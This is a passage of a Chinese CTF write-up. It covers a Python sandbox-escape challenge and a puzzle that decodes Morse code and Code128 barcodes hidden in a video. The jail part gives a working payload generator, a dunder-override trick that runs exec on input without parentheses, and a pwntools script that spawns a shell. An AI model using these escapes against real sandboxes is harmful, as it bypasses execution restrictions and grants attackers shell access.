<li><p>绕过了字母但是仍没有办法输入字符串（<code>__import__('os')</code> 等指令内是要传入正常的字符串的 ），于是考虑用True当作数字，并用chr函数得到正常字符串： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">factor</span>(<span class="hljs-params">x</span>):<br>    res = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-built_in">int</span>(math.sqrt(x)) + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> x % i:<br>            x /= i<br>            res.append(i)<br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">1</span>:<br>        res.append(x)<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_num</span>(<span class="hljs-params">x</span>):<br>    res = <span class="hljs-string">&quot;True&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>(x) - <span class="hljs-number">1</span>):<br>        res += <span class="hljs-string">&quot;+True&quot;</span><br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_payload</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">if</span> x == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;False&quot;</span><br>    <span class="hljs-keyword">if</span> x == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;True&quot;</span><br>    res = factor(x)<br>    payload = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> ind, i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(res):<br>        <span class="hljs-keyword">if</span> ind == <span class="hljs-number">0</span>:<br>            payload = <span class="hljs-string">f&quot;(<span class="hljs-subst">&#123;gen_num(i)&#125;</span>)&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            payload += <span class="hljs-string">f&quot;*(<span class="hljs-subst">&#123;gen_num(i)&#125;</span>)&quot;</span><br>    <span class="hljs-keyword">return</span> payload<br><br>normal = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzT&quot;</span><br>abnormal = <span class="hljs-string">&quot;ᵃᵇᶜᵈᵉᶠᵍʰⁱʲᵏˡᵐⁿᵒᵖ𝗊ʳˢᵗᵘᵛʷˣʸᶻᵀ&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">genstr</span>(<span class="hljs-params">s</span>):<br>    res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> normal:<br>            res+=abnormal[normal.index(i)]<br>        <span class="hljs-keyword">else</span>:<br>            res+=i<br>    <span class="hljs-keyword">return</span> res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_num</span>(<span class="hljs-params">x</span>):<br>    res = <span class="hljs-string">&quot;True&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>(x) - <span class="hljs-number">1</span>):<br>        res += <span class="hljs-string">&quot;+True&quot;</span><br>    <span class="hljs-keyword">return</span> res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">formatwithstr</span>(<span class="hljs-params">s</span>):<br>    news = <span class="hljs-string">&quot;&quot;</span><br>    index = <span class="hljs-number">0</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i&lt;<span class="hljs-built_in">len</span>(s):<br>        <span class="hljs-keyword">if</span> s[i]==<span class="hljs-string">&quot;&#x27;&quot;</span>:<br>            i+=<span class="hljs-number">1</span><br>            tmp = <span class="hljs-string">&quot;&quot;</span><br>            <span class="hljs-keyword">while</span> s[i]!=<span class="hljs-string">&quot;&#x27;&quot;</span>:<br>                tmp+=s[i]<br>                i+=<span class="hljs-number">1</span><br>            <span class="hljs-comment"># print(tmp)</span><br>            var = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;normal[index]&#125;</span>=chr(<span class="hljs-subst">&#123;gen_payload(<span class="hljs-built_in">ord</span>(tmp[<span class="hljs-number">0</span>]))&#125;</span>)&quot;</span><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> tmp[<span class="hljs-number">1</span>:]:<br>                var+= <span class="hljs-string">f&quot;+chr(<span class="hljs-subst">&#123;gen_payload(<span class="hljs-built_in">ord</span>(j))&#125;</span>)&quot;</span><br>            var+=<span class="hljs-string">&quot;;&quot;</span><br>            news = var+news+normal[index]<br>            index+=<span class="hljs-number">1</span><br>            tmp = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            news+=s[i]<br>        i+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> news<br><br>cmd = <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span><br><span class="hljs-built_in">print</span>(genstr(formatwithstr(cmd)))<br></code></pre></td></tr></table></figure> 此时得到的输入除了左括号以外都绕过了: <img src="/img/zjuctf2024/8.png" srcset="/img/loading.gif" lazyload></p></li>
<li><p>问题就出在左括号上，尝试了很多方法都无法绕过，包括特殊的unicode字符，都无法实现。直到我在网上看到了一些<a target="_blank" rel="noopener" href="https://tttang.com/archive/1397/#toc_python">wp</a>，里面提到了嵌套装饰器绕过括号，尝试在exec内部再次执行exec(input())来绕过所有限制，但是很遗憾，无法绕过空格了： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">code = <span class="hljs-string">&quot;@exec\n@input\nclass x:pass&quot;</span><br><span class="hljs-built_in">exec</span>(code)<br></code></pre></td></tr></table></figure></p></li>
<li><p>然后看到wp的后半部分，更改了<code>reprlib.Repr.__getitem__=exec</code>，是某个类的某个方法并且可以调用<code>a=reprlib.aRepr;a["print('whoami')"]</code>,但是首先我们没有中括号，那么就找不是__getitem__方法的(比如__add__);其次问题在于reprlib.Repr需要import，但是我们只有<code>import reprlib.Repr</code>和<code>__import__('reprlib.Repr')</code>，两种都被限制，就只能找不用import也能调用的类；</p></li>
<li><p>__add__相关方法在由c实现的class类型中是不能被更改的，于是运行脚本找到能用的库： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__():<br><span class="hljs-keyword">try</span>:<br>    i.__add__ = <span class="hljs-built_in">exec</span><br>    <span class="hljs-built_in">print</span>(i)<br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure></p></li>
<li><p>最后的任务是找不用import就能调用的类（我是用vscode每输入一个字符然后tab找的。。。），发现关键在于<code>__loader__</code>，它的类型是<code>&lt;class '_frozen_importlib_external.SourceFileLoader'&gt;</code>！ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">li = [<span class="hljs-literal">Ellipsis</span>,<span class="hljs-literal">NotImplemented</span>,EnvironmentError,IOError,__file__,__annotations__,__build_class__,__builtins__,__cached__,__doc__,<span class="hljs-built_in">__import__</span>,__loader__,__name__,__package__,__spec__]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> li:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(i.__class__)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure></p></li>
<li><p>题目已经接近尾声，我们需要改exec和input两个方法，但是只有一种类型，所以需要对一种单目运算方法进行修改：<code>a=__loader__;a.__class__.__pos__=input;a.__class__.__and__=exec;b=+a;a&amp;b</code></p></li>
<li><p>孩子们，终于拿到flag了： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>io = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">51954</span>)<br>cmd = <span class="hljs-string">&quot;a=__loader__;a.__class__.__pos__=input;a.__class__.__and__=exec;b=+a;a&amp;b&quot;</span><br>io.sendline(genstr(cmd))<br>cmd = <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)&quot;</span><br>io.sendline(cmd)<br>io.interactive()<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/9.png" srcset="/img/loading.gif" lazyload></p></li>
</ul>
<h2 id="锅里捞面">锅里捞面</h2>
<ul>
<li><p>稍微看了一眼hint，发现是以窗帘的开关时长作为摩斯电码来解密。下载附件是一个视频，在视频中，每隔一段时间就会有嘟嘟嘟的电报声，猜测是摩斯电码，用Au查看音轨: <img src="/img/zjuctf2024/30.png" srcset="/img/loading.gif" lazyload></p></li>
<li><p>人工一个个看过来，长短代表摩斯电码的长短，得到最后的结果并解码: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">MORSE_CODE_DICT = &#123;<br>    <span class="hljs-string">&#x27;A&#x27;</span>: <span class="hljs-string">&#x27;.-&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>: <span class="hljs-string">&#x27;-...&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>: <span class="hljs-string">&#x27;-.-.&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>: <span class="hljs-string">&#x27;-..&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>: <span class="hljs-string">&#x27;.&#x27;</span>, <br>    <span class="hljs-string">&#x27;F&#x27;</span>: <span class="hljs-string">&#x27;..-.&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>: <span class="hljs-string">&#x27;--.&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>: <span class="hljs-string">&#x27;....&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>: <span class="hljs-string">&#x27;..&#x27;</span>, <span class="hljs-string">&#x27;J&#x27;</span>: <span class="hljs-string">&#x27;.---&#x27;</span>, <br>    <span class="hljs-string">&#x27;K&#x27;</span>: <span class="hljs-string">&#x27;-.-&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>: <span class="hljs-string">&#x27;.-..&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>: <span class="hljs-string">&#x27;--&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>: <span class="hljs-string">&#x27;-.&#x27;</span>, <span class="hljs-string">&#x27;O&#x27;</span>: <span class="hljs-string">&#x27;---&#x27;</span>, <br>    <span class="hljs-string">&#x27;P&#x27;</span>: <span class="hljs-string">&#x27;.--.&#x27;</span>, <span class="hljs-string">&#x27;Q&#x27;</span>: <span class="hljs-string">&#x27;--.-&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>: <span class="hljs-string">&#x27;.-.&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>: <span class="hljs-string">&#x27;...&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>: <span class="hljs-string">&#x27;-&#x27;</span>, <br>    <span class="hljs-string">&#x27;U&#x27;</span>: <span class="hljs-string">&#x27;..-&#x27;</span>, <span class="hljs-string">&#x27;V&#x27;</span>: <span class="hljs-string">&#x27;...-&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>: <span class="hljs-string">&#x27;.--&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>: <span class="hljs-string">&#x27;-..-&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>: <span class="hljs-string">&#x27;-.--&#x27;</span>, <br>    <span class="hljs-string">&#x27;Z&#x27;</span>: <span class="hljs-string">&#x27;--..&#x27;</span>,<br>    <span class="hljs-string">&#x27;1&#x27;</span>: <span class="hljs-string">&#x27;.----&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>: <span class="hljs-string">&#x27;..---&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>: <span class="hljs-string">&#x27;...--&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>: <span class="hljs-string">&#x27;....-&#x27;</span>, <br>    <span class="hljs-string">&#x27;5&#x27;</span>: <span class="hljs-string">&#x27;.....&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>: <span class="hljs-string">&#x27;-....&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>: <span class="hljs-string">&#x27;--...&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>: <span class="hljs-string">&#x27;---..&#x27;</span>, <br>    <span class="hljs-string">&#x27;9&#x27;</span>: <span class="hljs-string">&#x27;----.&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>: <span class="hljs-string">&#x27;-----&#x27;</span>,<br>    <span class="hljs-string">&#x27; &#x27;</span>: <span class="hljs-string">&#x27;/&#x27;</span><br>&#125;<br>reversed_morse_dict = &#123;value: key <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> MORSE_CODE_DICT.items()&#125;<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;payload.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>tmp = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.readlines():<br>    tmp+=reversed_morse_dict[i[:-<span class="hljs-number">1</span>]]<br><span class="hljs-built_in">print</span>(tmp,<span class="hljs-built_in">len</span>(tmp))<br></code></pre></td></tr></table></figure></p></li>
<li><p>猜测摩斯电码揭秘结果是base36加密，但是我们没有base36加密对应的表，偶然间结合视频题目代号128，猜测是视频中还隐藏了C128条形码，是base36加密对应的表。但是音频已经揭秘过了，于是猜测条形码隐藏在图片帧中，写脚本比对每一帧与第一帧图片的每个像素，果然发现了猫腻(比对代码是GPT生成的，懒得写qwq): <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># 设置输入视频路径和输出图片保存路径</span><br>video_path = <span class="hljs-string">&#x27;128.mp4&#x27;</span><br>output_dir = <span class="hljs-string">&#x27;frames&#x27;</span><br><br><span class="hljs-comment"># 如果输出文件夹不存在，创建它</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(output_dir):<br>    os.makedirs(output_dir)<br><br><span class="hljs-comment"># 打开视频文件</span><br>cap = cv2.VideoCapture(video_path)<br><br><span class="hljs-comment"># 读取视频的第一帧作为基准帧</span><br>ret, first_frame = cap.read()<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ret:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;无法读取视频文件&quot;</span>)<br>    cap.release()<br>    exit()<br><br><span class="hljs-comment"># 将第一帧保存为图片</span><br>first_frame_path = os.path.join(output_dir, <span class="hljs-string">&#x27;frame_0.jpg&#x27;</span>)<br>cv2.imwrite(first_frame_path, first_frame)<br><br><span class="hljs-comment"># 将第一帧转换为灰度图像</span><br>gray_first_frame = cv2.cvtColor(first_frame, cv2.COLOR_BGR2GRAY)<br><br><span class="hljs-comment"># 设置帧差异的阈值，用来判断帧之间的差异</span><br>threshold = <span class="hljs-number">0.8</span><br><br><span class="hljs-comment"># 初始化帧计数器</span><br>frame_counter = <span class="hljs-number">1</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># 逐帧读取视频</span><br>    ret, frame = cap.read()<br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ret:<br>        <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 如果没有更多的帧，退出循环</span><br>    <br>    <span class="hljs-comment"># 将当前帧转换为灰度图像</span><br>    gray_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)<br>    <br>    <span class="hljs-comment"># 计算与第一帧的差异</span><br>    frame_diff = cv2.absdiff(gray_first_frame, gray_frame)<br>    <br>    <span class="hljs-comment"># 计算帧差异的平均值</span><br>    diff_mean = np.mean(frame_diff)<br>    <br>    <span class="hljs-comment"># 如果差异大于设定的阈值，保存该帧为图片</span><br>    <span class="hljs-keyword">if</span> diff_mean &gt; threshold:<br>        frame_filename = <span class="hljs-string">f&#x27;frame_<span class="hljs-subst">&#123;frame_counter&#125;</span>.jpg&#x27;</span><br>        frame_path = os.path.join(output_dir, frame_filename)<br>        cv2.imwrite(frame_path, frame)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;保存帧: <span class="hljs-subst">&#123;frame_filename&#125;</span>, 差异值: <span class="hljs-subst">&#123;diff_mean&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-comment"># 更新帧计数器</span><br>    frame_counter += <span class="hljs-number">1</span><br><br><span class="hljs-comment"># 释放视频捕获对象</span><br>cap.release()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;处理完成！&quot;</span>)<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/31.png" srcset="/img/loading.gif" lazyload></p></li>
<li><p>某些帧存储了条形码对应的信息，按帧排序，同时出现的白色照片张数就是该为条形码的编码值，写脚本读取并解析: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_columns_as_lists</span>(<span class="hljs-params">image_path</span>):<br>    <span class="hljs-keyword">if</span> os.path.exists(image_path):<br>        image = cv2.imread(image_path, cv2.IMREAD_GRAYSCALE)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <br>    width = image.shape[<span class="hljs-number">1</span>]<br>    columns_pixel_values = []<br>    <span class="hljs-keyword">for</span> col_index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>        column_pixels = image[:, col_index].tolist()<br>        columns_pixel_values.append(column_pixels[<span class="hljs-number">68</span>:-<span class="hljs-number">68</span>])<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> columns_pixel_values:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">sum</span>(i)&lt;<span class="hljs-number">10000</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">sum</span>(i)&gt;<span class="hljs-number">27000</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br>lis = <span class="hljs-string">&quot;&quot;</span><br>last = <span class="hljs-literal">None</span><br>leng = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">172790</span>):<br>    color = extract_columns_as_lists(<span class="hljs-string">f&quot;./frames/frame_<span class="hljs-subst">&#123;i&#125;</span>.jpg&quot;</span>)<br>    <span class="hljs-keyword">if</span> color != <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">if</span> last==<span class="hljs-literal">None</span>:<br>            last = color<br>            leng = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> last==color:<br>            leng+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            lis+=<span class="hljs-built_in">str</span>(leng)<br>            leng = <span class="hljs-number">1</span><br>            last = color<br>lis+=<span class="hljs-built_in">str</span>(leng)<br><span class="hljs-built_in">print</span>(lis,<span class="hljs-built_in">len</span>(lis)//<span class="hljs-number">6</span>)<br>code128b_dict = &#123;<br>    <span class="hljs-string">&#x27;212222&#x27;</span>: <span class="hljs-string">&#x27;SP&#x27;</span>,     <span class="hljs-comment"># 空格 (Space)</span><br>    <span class="hljs-string">&#x27;222122&#x27;</span>: <span class="hljs-string">&#x27;!&#x27;</span>,      <span class="hljs-comment"># !</span><br>    <span class="hljs-string">&#x27;222221&#x27;</span>: <span class="hljs-string">&#x27;&quot;&#x27;</span>,      <span class="hljs-comment"># &quot;</span><br>    <span class="hljs-string">&#x27;121223&#x27;</span>: <span class="hljs-string">&#x27;#&#x27;</span>,      <span class="hljs-comment"># #</span><br>    <span class="hljs-string">&#x27;121322&#x27;</span>: <span class="hljs-string">&#x27;$&#x27;</span>,      <span class="hljs-comment"># $</span><br>    <span class="hljs-string">&#x27;131222&#x27;</span>: <span class="hljs-string">&#x27;%&#x27;</span>,      <span class="hljs-comment"># %</span><br>    <span class="hljs-string">&#x27;122213&#x27;</span>: <span class="hljs-string">&#x27;&amp;&#x27;</span>,      <span class="hljs-comment"># &amp;</span><br>    <span class="hljs-string">&#x27;122312&#x27;</span>: <span class="hljs-string">&quot;&#x27;&quot;</span>,      <span class="hljs-comment"># &#x27;</span><br>    <span class="hljs-string">&#x27;132212&#x27;</span>: <span class="hljs-string">&#x27;(&#x27;</span>,      <span class="hljs-comment"># (</span><br>    <span class="hljs-string">&#x27;221213&#x27;</span>: <span class="hljs-string">&#x27;)&#x27;</span>,      <span class="hljs-comment"># )</span><br>    <span class="hljs-string">&#x27;221312&#x27;</span>: <span class="hljs-string">&#x27;*&#x27;</span>,      <span class="hljs-comment"># *</span><br>    <span class="hljs-string">&#x27;231212&#x27;</span>: <span class="hljs-string">&#x27;+&#x27;</span>,      <span class="hljs-comment"># +</span><br>    <span class="hljs-string">&#x27;112232&#x27;</span>: <span class="hljs-string">&#x27;,&#x27;</span>,      <span class="hljs-comment"># ,</span><br>    <span class="hljs-string">&#x27;122132&#x27;</span>: <span class="hljs-string">&#x27;-&#x27;</span>,      <span class="hljs-comment"># -</span><br>    <span class="hljs-string">&#x27;122231&#x27;</span>: <span class="hljs-string">&#x27;.&#x27;</span>,      <span class="hljs-comment"># .</span><br>    <span class="hljs-string">&#x27;113222&#x27;</span>: <span class="hljs-string">&#x27;/&#x27;</span>,      <span class="hljs-comment"># /</span><br>    <span class="hljs-string">&#x27;123122&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,      <span class="hljs-comment"># 0</span><br>    <span class="hljs-string">&#x27;123221&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,      <span class="hljs-comment"># 1</span><br>    <span class="hljs-string">&#x27;223211&#x27;</span>: <span class="hljs-string">&#x27;2&#x27;</span>,      <span class="hljs-comment"># 